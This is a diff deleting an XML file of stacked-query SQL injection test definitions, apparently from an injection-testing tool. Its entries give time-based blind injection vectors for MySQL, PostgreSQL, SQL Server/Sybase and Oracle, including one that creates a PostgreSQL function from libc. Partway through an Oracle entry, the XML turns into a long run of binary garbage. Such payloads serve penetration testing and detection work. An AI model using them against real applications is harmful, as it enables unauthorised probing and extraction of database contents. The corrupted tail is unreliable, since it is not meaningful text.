@@ -1,419 +1,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-
-<root>
-    <!-- Stacked queries tests -->
-    <test>
-        <title>MySQL &gt; 5.0.11 stacked queries (comment)</title>
-        <stype>4</stype>
-        <level>2</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
-        <request>
-            <payload>;SELECT SLEEP([SLEEPTIME])</payload>
-            <comment>#</comment>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt; 5.0.11 stacked queries</title>
-        <stype>4</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
-        <request>
-            <payload>;SELECT SLEEP([SLEEPTIME])</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
-        </details>
-    </test>
-
-     <test>
-        <title>MySQL &gt; 5.0.11 stacked queries (query SLEEP - comment)</title>
-        <stype>4</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
-        <request>
-            <payload>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
-            <comment>#</comment>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt; 5.0.11 stacked queries (query SLEEP)</title>
-        <stype>4</stype>
-        <level>4</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
-        <request>
-            <payload>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &lt; 5.0.12 stacked queries (heavy query - comment)</title>
-        <stype>4</stype>
-        <level>3</level>
-        <risk>2</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])</vector>
-        <request>
-            <payload>;SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))</payload>
-            <comment>#</comment>
-        </request>
-        <response>
-            <time>[DELAYED]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &lt; 5.0.12 stacked queries (heavy query)</title>
-        <stype>4</stype>
-        <level>5</level>
-        <risk>2</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])</vector>
-        <request>
-            <payload>;SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))</payload>
-        </request>
-        <response>
-            <time>[DELAYED]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>PostgreSQL &gt; 8.1 stacked queries (comment)</title>
-        <stype>4</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
-        <request>
-            <payload>;SELECT PG_SLEEP([SLEEPTIME])</payload>
-            <comment>--</comment>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>PostgreSQL</dbms>
-            <dbms_version>&gt; 8.1</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>PostgreSQL &gt; 8.1 stacked queries</title>
-        <stype>4</stype>
-        <level>4</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
-        <request>
-            <payload>;SELECT PG_SLEEP([SLEEPTIME])</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>PostgreSQL</dbms>
-            <dbms_version>&gt; 8.1</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>PostgreSQL stacked queries (heavy query - comment)</title>
-        <stype>4</stype>
-        <level>2</level>
-        <risk>2</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
-        <request>
-            <payload>;SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)</payload>
-            <comment>--</comment>
-        </request>
-        <response>
-            <time>[DELAYED]</time>
-        </response>
-        <details>
-            <dbms>PostgreSQL</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>PostgreSQL stacked queries (heavy query)</title>
-        <stype>4</stype>
-        <level>5</level>
-        <risk>2</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
-        <request>
-            <payload>;SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)</payload>
-        </request>
-        <response>
-            <time>[DELAYED]</time>
-        </response>
-        <details>
-            <dbms>PostgreSQL</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>PostgreSQL &lt; 8.2 stacked queries (Glibc - comment)</title>
-        <stype>4</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
-        <request>
-            <payload>;CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])</payload>
-            <comment>--</comment>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>PostgreSQL</dbms>
-            <dbms_version>&lt; 8.2</dbms_version>
-            <os>Linux</os>
-        </details>
-    </test>
-
-    <test>
-        <title>PostgreSQL &lt; 8.2 stacked queries (Glibc)</title>
-        <stype>4</stype>
-        <level>5</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
-        <request>
-            <payload>;CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>PostgreSQL</dbms>
-            <dbms_version>&lt; 8.2</dbms_version>
-            <os>Linux</os>
-        </details>
-    </test>
-
-    <test>
-        <title>Microsoft SQL Server/Sybase stacked queries (comment)</title>
-        <stype>4</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'</vector>
-        <request>
-            <payload>;WAITFOR DELAY '0:0:[SLEEPTIME]'</payload>
-            <comment>--</comment>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>Microsoft SQL Server</dbms>
-            <dbms>Sybase</dbms>
-            <os>Windows</os>
-        </details>
-    </test>
-
-    <test>
-        <title>Microsoft SQL Server/Sybase stacked queries</title>
-        <stype>4</stype>
-        <level>4</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'</vector>
-        <request>
-            <payload>;WAITFOR DELAY '0:0:[SLEEPTIME]'</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>Microsoft SQL Server</dbms>
-            <dbms>Sybase</dbms>
-            <os>Windows</os>
-        </details>
-    </test>
-
-    <test>
-        <title>Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)</title>
-        <stype>4</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END FROM DUAL</vector>
-        <request>
-            <payload>;SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL</payload>
-            <comment>--</comment>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>Oracle</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)</title>
-        <stype>4</stype>
-        <level>4</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END FROM DUAL</vector>
-        <request>
-            <payload>;SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>Oracle</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>Oracle stacked queries (heavy query - comment)</title>
-        <stype>4</stype>
-        <level>2</level>
-        <risk>2</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END FROM DUAL</vector>
-        <request>
-            <payload>;SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5</payload>
-            <comment>--</comment>
-        </request>
-        <response>
-            <time>[DELAYED]</time>
-        </response>
-        <details>
-            <dbms>Oracle</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>Oracle stacked queries (heavy query)</title>
-        <stype>4</stype>
-        <level>5</level>
-        <risk>2</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END FROM DUAL</vector>
-        <request>
-            <payload>;SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5</payload>
-        </request>
-        <response>
-            <time>[DELAYED]</time>
-        </response>
-        <details>
-            <dbms>Oracle</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>Oracle stacked queries (DBMS_LOCK.SLEEP - comment)</title>
-        <stype>4</stype>
-        <level>4</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-       ¼ç?F2ÙF#ï)‹“M¡™•ÑÊò¯ -®Ýý#ýÝx»cNJÝ âohêÜDa=‰ ìGüø“î‘ %ôÆ âïèç]yÅ*ÎLä7P){KÀþÖqvð»/öN›ã×¡
-Þ¼žÊfm/6úu€À€€@„a#ævOf˜rÐ¯^½Š_[™)àH0FÓbÑµàî¿½SÜq•nN]w%ˆeHÑMoVFá‚£EÔlªWÕ×Ñ¾êÌ9½Úlðª›US†=úK«paZ/ÀÕ³¢‘qieeå:"¾â*úã3·*Fž×EgÆgí€(£Ec5•êB]:ÚÇ]z©¿jí²OÄR5+€«T9C” 0C¸ÕêéýÐBþ§‡¿™ÆF Í\w-ø "ê4NušN¨ÕÔ¨¶˜s:¼-<ü‘¼—K!4Í´Q	õJ·}ÉËÃðxhï9ä€c¸ñõý;èdÝB ”³™Ô}
-Ä	D¨«qÛ¸Eiì²£–ÜpB))‹˜zM—Pj}µ–(‚°!Ø ”è„-V\ÚvœyÊ·«öþ/„Ï²žl ‘Ãù3zh*ô‚cr@«æ#·«»{„žýý·)S÷ àÏ÷ÙzoÅwû*k¾HÙßÑ‹<€!–tØtøÓ[ñ„ÐÛDYrsÃ ç­¢;Ð6ˆ56›iÐ¿÷â]Üðÿrsó§Í_¥²¬ƒô¡
-V*ÛþŽ dp&y‚¯ó=÷Ô.Ill£rÿÖ\‰ÄJÉWÑË¿5E	Jºº*ë}2NXlŠ" Pa–Jpø˜\mçÚÛ{Óé& GÖ½]e®miÁÛ‹3ÌÀÔª$PšK½Túªt80ŠF&¢‰ñ¹™bßy¡è÷ßBÿ@†) `"¬d3NX‚t¡cÖ˜ÆNEÝ³½M¾måe ‡kÓz²Ñkeæ,žéÙ÷¹¬«`žðG’‰JL-áÑJ,Àxc¹§NKÞ°„Ï÷ÕTÈj
-Ù¨Žî/ÃÝ;ûäþîB^º1e°ü!$öC8™€Á7™]‹Õ!ëðÚ-ÚÐÄ$°Ý4™šMÔj¡!ælör
-³YÚùÆ²Š©@š³$öÂI¸“ISÑœÌ¶¸Ÿl,WQ/†¼1õ¢·!ÓŠVC«o-Y/N ²“´€>ŠxohhÊm®Ê‚I¬€É¸Ñ×}D:ÿ`-h6˜ÿ‹#ç}Ÿqœœof!ëˆV9¿è!hjÆßmn¾‹÷N÷ yñ.È{É½ZgÄÒ üïÛ·Õr£õù úžss»“PðînýùKÿîîVœr>Ãîûº¦‡n^y}ïÊ\üæt2éžY™+W!+´±I dðÃÕpEG-ÅÉú‚‰L4l1ÐõÎv°_GÇÙüÚjv²C¡âjj`ÞYH\.]^Gs¹çÀ§‹é…RX­ì©ÌùÇ×PÈß?DcT«k	å ë` ý ¸›¦3¶FÂk—ò€„¸Ì^“oRA¬yáò©d¶<j'˜±­µq“Nƒ†Øˆ‚IÒ—Mëä-†zúéÏÿÐÉ„Pzå©öPZfW‡¡F£½5®?œŸÿÍØ€õ‹ÇOnü‘ ØBBŒ‡€õ”j†@:AÂý/;íÑPÔ>\¨I%ÇSM&ÒhPá‰yê®Ù<*Æƒ4â éO}@¯„QÚÐ2lr °&ªÂ ›VQÆ-[ÆH²ë‹”w¿'@\º<ê³äò²Þ
-°ÿ†>tˆcgp‡ÙI'¶päüùc¡‰Nžô
-f•V_ƒà´H1•°MñG›Û?ú€ß¡Vï£àäsµcÀ€Ø¼Â¼,¦£8àvÃ¯c¸N9=ôòÚÖ—qÔ×xõæÍ¿^NgB¡Œ;æÞq¡úÊ\™:q{çÄÎ´Ë?77d^2¶z³)z³8¡gzœéLß¥3Å¨—í¨W€åluë»"Àu @¸KTËêƒF—N/†¢8dÈ&ré˜Nm(¤âþ[ßÆS°DOWìZ
-fø³G44tÜi%ÎNî3 é¿ò¼ C B8À=\*ÈU<yÊ
-Pàè-Ï ˆ¢ÙòC´ll5´4!z:
-ýý_6;Ûˆ¸$M ¶0ÛÁ‚N9À¢^$@Ðòtéáýùùç.ð¿¶Dv®@ô&åI¤’uÛp¶¤£‘®t,½0\_í¥­Q<ÁÍ`Âu¸µH pÈÎÌ„ø´÷çßmÉD:…£@¬Ís²¦h&ð5ËX'Àm¸a]„ÒáÕ|XI~
-$¸ÀiÜ ¾7Z¬D?ëZÖ*ªö _²I?Ò½_y0øáfÜ‡¿ùæêÉã#?3âÿÊ[Ö›eG‹¼É¨Ò›n¡[æ£ÉÉÔ£½íí«×ƒ[Qˆy °õ…Ði+æ¢%IÖÙ½†ˆò’s×f¦v2!ôœ¾÷•Ç‡¦†^ß¼rsÎ?Ý'¥½yÉ.dWÌ¶¶ïÌjÂ‰Õq"Þ‚Ò=Î²Xkïë Ï¤fk«Yˆ$Ü²ú‚Ew*‘…Dx4áŽ˜˜˜‰úêv]âÌàŒ+UCâìb ÔÅÏ€ˆ¿.»3âÀuJu§1Z4©[$–¢ÎwqÈñèTØ•Vpž¼þq8f%‰¬jÀ"˜õòµJR@j¹\éüÓß~÷ïÍNGR¥ŸMêîJKêôj  Ø£±œš_º3ÿø.0(ú¶.áDêÿØºÖ˜6Ï3Šë[,;v°e		ÔµMÜ$¶M¥vˆùAŒ=s±ƒKBoŽgˆdCPÑÀ€×F¢Ê¥BN¨n,M‚hš«Hñþ0¼tÊj…iRÇVÕ´FY“ˆþÙþL =ç}?“dÝ—"Ü"ç;Ïå=ÏyÀù„Ç]Ð¿2nL@áB™ÒØ^Xè?j0‰#XØŠyu6Á X\³iÙ1ƒÑËpµ“ŒÁÑw³¹µ
-±Ù9	FÙ+™Ì/¹Ù”þÒ<[ Ó.[¯Ä['tÁÙ“Gèêéò Q‚ôâ nÐÕd7$'%Ú’ÁÞÂ1kkùï²á% îÝ½ÿO·Î½Kî9*ol¬J”Ì;¤–
-ºµžÖïï>øvÅÚ¼÷€0kÆªB†ó+°áÖñŸÉ‚Ë9Ø;ˆegÛÚfga?þøñw76{0·z»­ò`!xØ9x®Î4G‡ yYílˆ/ŸüHŒkE Pu\oÔâ‘ÔWùý‹~8ìøºŽ:a=“JDê›#8ó$rqÈl6b@Asza!ðåÓµµb0¾3…û\Á7;ëººìJ•tíf8ðY«©\º2óg¾Õ'úAåI±¬ÎB·	M\=;3‡²N6é ¬h”d0à\°òô«Rc·R‚)¸¶ßÿû¿7|\Ù¨¬x~±“ ‹3íj65yøôØÀØ——ÁtçÒÀ~ýÊ%bÀJ,‚d^Œø•ì0ŽU ¢0ómTM7šbaƒÅ¶VñµÆU5žÍ¦ÁB>ï¥žnñàÜmóò½sú²3ªØ~açÀZEY¨Çd€L™ Su†’@µ ³Ïõbç`W×®“¾Å–0ôöº|vC{F!q/[öøZ°•†ÀÇãï«µ¢‹*q$‰ð÷ ÈV‚ï‚zMIùŸVK¢XÝÞÜZm°v'V¶¾ß^­OAÃDÕã/tð†! .YG{Û>…PkuÆÙX]F‡Váª‹P;ØqíhºZˆ />†Z$:3ƒÇ/ÈlE@ÅAÊûéõ¨9ØXM'‰ÊˆÎBí#—×³þæD,6Áyn!–›ä!¸RÐ´R¹×Ÿ\^Z,~½ úñ Štït);[TJÉ¢IÎ\" C!JÌFù¡þ˜I)­ñ²V©vc[ ÎEdŠ%/hÁ†¶šQ+ÉS˜×)¡å}% Ép?C7ÿòÏ- Ø¥©Ø)BÄc5%OñÔÖˆ9<vi lNO]ùí¯?º10Õˆõ&`cÖuŸB \ì}sk<Œ©åöXÚnÐ…²Ì¸²»;‚Hœ‹ck>3Éf~ôÄ€F¯›µ¹ôÆr7$Iv(Ó{ùÒBh¸cëM¬	ê¢B2^)º‰¹„À® ŽA§ÏlÒL{U÷e‰MÞrò{5ÈÏXû… 5ôîØcÀwaÝÕu¨Z-—ŽP¡—‘J§Ý ÀkëÖƒí•h·»Û¿}ïáÊ`µND ;Š£ìf¾áÇÇ|‘\ý¢Ñh}tfcfƒ¢oßÜ™¶¶Þæq2ø±ë«¶¾N|[T2ÉK—jãb…`ô; ­>øðR4v7©Ö¤­Í‘Hs|ÑSåi˜ôç3óK^£Œ (,üúƒÁ§JÿøšàÆ¤È\l!˜§¦§ &ÜÎ ¨6&Ô¬AþgþR.5¡læ²'Þð­¤ÐœÒ³áiœÑ†–‹”R>&ñj%%¹Æm Ã(!†a­| ’"°üæÕíí­‡Õ<¹Tîü‘ŠGðÝ™jnWp˜"ïuîQ~ãW¿¹>v»ñ Ïø€ï¢3<
-‹¼•Ü¤Öb0:z¨ZÎMMpÜÊ(Ð,ÊX:???ÎEîlŒŠ7¯Aˆàl
-ÙskJ^p U¢NTÆÈ (Yrz"AD¾¾Ù»vÕúvùš¨&ö›GI+Qä©˜7¥;@€l;5?úû. {ÃN<ß{íü-F€(IºN@˜12©—¥Ò¢ÖhóÖø)onžû	€›¾ò1ftÌ(¿ŽNB¦óÉ“h{ÿ»Vìš¡Üïý¾¡hk+d¥½puqs9_¹T…˜‰$6Í%T’Ÿ\ª'Of×@íÁƒlr·¿™ð×ƒl.èkŠÌ†}æÜb<ÚwÍôG<×†‹Y
-$Á¦ÔZº¿%X(eJkBk&æ×Pk ™L -Â4É×ËÓ	C0)× 9þB©eP§-¦_ÐÝ±AsÇ8î
-ÛqµFŠ½E/4ZŠÐ»²eµ†/i(ç€jN€&€JyûÕû3Û÷žWÁüâËFY&Ç,Õ²h4SWpwóòØïn|tãÊ¥ÛrH¤p,wÕû ÊG;ßÁâ0µ›äº`Ì~H—ŠuÃCÎïŽxjº³Tç²ón"<ÖâÕrpôÒùü‘¹J¶@´˜´2£›	“ÀòÔ è„5…d^°hö,ŒÎ^8Y{’ðwáTGGÀ¤,Ž%…D»µa¾áÃ7øvtŠ¿¯Š-À#G ½²-c@ ðv8Gï±cqí²Wë®“
-^ú¿Zý¿|°ùìÙÝQbtë•#G5ŒÀ
-hÔ„E¨–ÿuþÌE*{7"‘(ñ!UC”{Ïž9å<Fµ‰ÓÕR¶‡›†~
-ÀXXM ±m={Ý£×z¸¹sb.`n¯\ÎÙ	øãÇ#žQçðB>;i;H¨¶Òß|ó´ô¨TŠ]ëhùüç~L
-ÏÕ·ö“„¿iÝDM2¥A¨SOtÆýi5 (®_(LN3ã½Â¬mÅóN‡A½¦âz	Peñ*ý¼ªY‘^æ…Ï2`e€&~AùN¥kÿüêýío«_ŽÀƒ|å#›’# Â,èôŒÅÆn¿35ðÙgW.]®DËš5¡•Êó8H[¡'ƒîF4Ï2˜í!³®:4ìÉŒ¿ÁÚìIdá—àç	€Pî¸½z7¡§¿&m"ªlúò‚$	²T\z„e8V\›Å?£$#n™¶Hé‚}qhö|ñ.ëpuí£çgÚFß«NGHÌWÖò¬Úý¯?¯<^„ßÞÎ}rëÜk¬/zóÄ>B`Ñ¨ÏX¤Ê­ñŽ»>Ù^IøW˜æÏ¯0:÷é*Ð0²©Ú.ReOÜÈÌêj+àÛÌÐÊé<ÛIŸÏî"”âM¬êÿàï‹/žüÍ4®’Ç ½þœ?Ç– ù†a'ãPµí$>Å~x¤¹ÏåZÌ%è®QäÕ¡Bá‘_©4KøKþõiºŸ`~­³yn˜pDÍ ˜D^F ŒM˜Ì]€ã/dÎ—q‹åºP¹—Š3@ˆÓå:TJØå( ‰—´˜ÚæÒIÕŠÌ›Ñ—ðW Ó;Qr(µ¤ÚÛïÜ¿ú¿È+b‘k‰ß¨¢ððMXC_¿4uùæ ü)ÿøk0Dgv Ç…×Ø¹‰pñ8$Œ·íÛS›êRÁœ¿Þê±æÖn6¿˜ÍyÅáå£Hle¼ÑÈ7¥óI$Þ¸LëÖ"íHÆ—mª%7Ó-ƒÝu‚eM!wãCg{á[{,€ÅÈê¢‘>ž¢Eš‘_¬eE0‹Á¯îï!îÞá?¦øÝ»û¿\]Lšù—ˆú2ÊŽÖZo¨Ö™Iëá9wfPª¡•qb=,½9ËÑ6Áw½Pn!¹¦yoaôÞ,êbÓ—æ’‘šIÒÞIzaÝ-—úÇ-ÝKš»›&&]v×ìyžï«m‡µI)¦ôåó>¿¾Ÿçóùò°ùcD NÍªÒ“5Kƒ¡%rã‡©eŸp    IDAT­g®nìwË[•­ÊÞŸœjF¤ÓIå:ááö÷ßoGsÚzBnhÈŽŽ?ˆ¾ué	wÙ íwáãì°8ä~íLÉêßµ.8_uö2
-Q¬Iàða;1‘
-¶	o³!†'¼ÃÝ9[’Ÿu·t·õ}å|¾šá“s™pµúäI5/³nøFl¡¥ÔÌ$¹EâÍ•ôjM8Ì¡V.âoÍgâi;Ò¢8u}`@)÷Ï&~ðœnQ"ÚNÞ,‰-iT“5ÈHYV[†Ð£SŠáZhS	€Vrw0Z‘lïXê3öýñ§" å=¦ù·“è±vÄ.XI ¼víO·®Lg¡	ùìæ{ïN÷ :ñb³å)9ã²6ÔÃŒ:ÃÈ5fS|.Ð¥ÚSñ¢B`ËB¸¥Ñßí-Ò´c¡5ØÅÍo­Ê`Ïœˆp¡`©–4ë%y;Õ…ž(²«ù|¹(•ˆFÖŠ¢ÙáX”H‹(pÎûÆ£Cð	ô8Ä+ÂO.Z9gUHð?#"–ÈÀÂcà}­,ÿîÛÐƒ\½ %à!?øÞóÚQÈ¬“ZËRí$Dë–î/žUþéòÚ½wïT6·–ÿ¶÷T3Ó1#!ú½À‚’¤'ÉtuDÝW¯^BÝôÕ“É!aä2Êç¢´ßÉãÇðõÉnvØ³#$ùø6ãPm·Æ\c]Ã¸Ü*åèaVWOBä]±NžYþÜÖµIvÚBç…D"¤L­ä‹o;öMõéŸT«óB²³“wmŒFyÌÁhÒ¡©3âP•™õMuñyŽaPô¯¯¼…QÞÁqÊæú@\I	W€è¼åÕÖU(äiÀšHïÙãÇ,eAš VjX‡LnT’tmIrF´v  hÂy#Þ×üzßÑ:9s˜ßé#ê(–É‘K@$Ô«†5{ñúÍ?º8ýç+ŸÜºyë·Wî×_•8Œ“¥a@r“7pÍF
-ƒš†Zu_(Óÿ¨z;R¥o÷«þpqØÙÒ»ž÷“ª–PÇ´Sª]Jwœ‚eÔÜS–ZìžôÒ¬'U¶Tó*6¨ÿøŒ™›T)´ë¸àñææhüÄÍÊdŠ<®=u,ŠÇÄUt6ˆÞ1ðÿª?ŒûN\ýòÜÛ¤™*>·ç—õÎ§´+œÕ®µxü¾¯ýp×ëñß]ÛÚ¬¬-ÿª™ä…	€HoSO„:C!’–¡¶€äÊ¸Ï¢”ß}]õ­F¢÷GN¢üßàlwö¢–³´]!þø1Ñžoãê°á1B
-Î}|'Î·‡’Éc(,ƒÎUŒ‡…^Ÿ`c’¾€l! œ)
-ü¥¿?ª¢û\>âòI>Øå½œ+•Ö×	€& šk2š^µÕé©	6™Ö!3Y,öY+@R¯okCÈˆÒÃri¾Ôqyx§¢zD‚4&,­ñ%ë:SÇ 4hªFo+=¹4ÖÔ™¬I©aËÏ‡ŒâÉ @èäpMÞì  ~xë¤à{¯cž>C0Ñø5.PÉIë5¦{îý£¹0¸ë«Ä0¨7dúûã¸È(Í{½-ÎX©€žNóùFq˜Ç€ØdlMáQQ¯aP›&¢7mÙ‹ùü"<¦ò³‹Z	[U“)0û–U
-Ã¼á¶ˆÏ•`²°.BKVEý¤™4ÎK».¿âœx"N¡_ì~Ùã×ûO^8wèÐøƒø
-Ü™UUÞlMk-v»omsë—êÀÍÊòÞSh/Æš¤©'’6ä>ÙèŸQùÏ‰’tŸÛ=téìYä‡¹Ñùòþƒ/¢«ˆ?·«ýÀp;“1FÓÛL5ëöw¯Í¹6Á.äI½ÁÀ,‰Ö™¹p›±SH&mÈu Gz|½2q°“ä›CA>œúôÉJq!qù‚Œ8‰Ñ Ê”Ê3" ácª„®°©I©3vè:Šð9¤íZ™§ŠÂ&ýÁƒjkOÙY+{Xe¸iE[*Ñ¦e8—V1ƒEQií31 jð|ºmÀÏDaÐ„ÏK©lÖ,›2 ó:üv2®Ú \Ýì»Ð„0 ~ò4#gz˜ò*½ ãpµ=žž×ÐDÛñö•z}S“n ‡Núá˜7óú3á§ßë?ÀDS;)'2@,URFœ¦95B’R°Ä³´85•®Î¨$¢ˆÞtE‡Ã\•)ìÈ‹O…ÃƒzŽk€öW¥­š!oX=ÿT
-ïûLáðî)ð›GZ÷íÖ~, þèÐñ7Þ~	,Ö–¡è±û]k•Í;7¼w*lB>?eÆÕ|¥YmF j”!´\à_:M`ÞBÕ¾o¿Eß7÷D]¿û>¾¿ºjKºG¢¬òÛ`š;KGXNä|c1/Z¦´ ÇG™N`0˜)v£¤¹é69ŸOžœÆþX°åm}‘„ËYœÍW«™LÌ9æOÇ}ÃÎñÑQ@j&3ƒ‡ýñ¸QÍ•ûscóÝØëJ–FÝíREYc†¢¯W£Ð$’Êp³:ÀÛBb§14	(T2‰§Ã4c|€Ð¢>=8ym)ž}ôÕ4Ñ¼jvyûòFiÁRNŽÒªbTê ö»~í^V—½ò‡÷PãXC´i#æsâ¨\Óóé×¿G¯ubj©1â¢†t¼4 tZ,xçÃ±p&†Æ${¡RÙ"ñTnÇ‚!-Ëpí€a	ÉK9m·{òe6œQˆ’âU A*Ä%\?Å‹Ô²CQ\Æè%‹”h‡ÜWzãÄ!6†9¼ÿÍýGZŸwäÕ
-øð	ÿž? <XW»dÈ›g<à³­Íµ»±oîT–+ «ôg”käÊ9!‡â¦¨tš#S7y,ñjtGPm{ûáöC”|ár§þ‚tœ!ô‰ËFâÖFÀÖ0¶áõ¡0ô
